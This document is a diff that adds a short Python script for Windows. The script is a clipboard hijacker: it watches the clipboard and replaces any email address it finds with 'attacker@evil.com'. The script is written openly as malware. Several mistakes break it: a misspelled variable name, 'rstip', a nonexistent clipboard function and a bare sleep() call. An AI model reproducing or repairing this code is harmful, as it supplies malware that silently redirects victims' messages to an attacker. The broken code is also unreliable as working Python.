@@ -1,0 +1,15 @@
+import win32clipboard, re
+from time import sleep
+
+attacker_email = "attacker@evil.com"
+emailregewx = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
+
+while True:
+	win32clipboard.OpenClipboard()
+	data = win32clipboard.GetClipboardData().rstip()
+	if (re.search(emailregex,data)):
+		win32clipboard.EmptyClipboardData()
+		win32clipboard.SetClipboardText(attacker_email)
+	win32clipboard.CloseClipboard()
+	sleep()
+
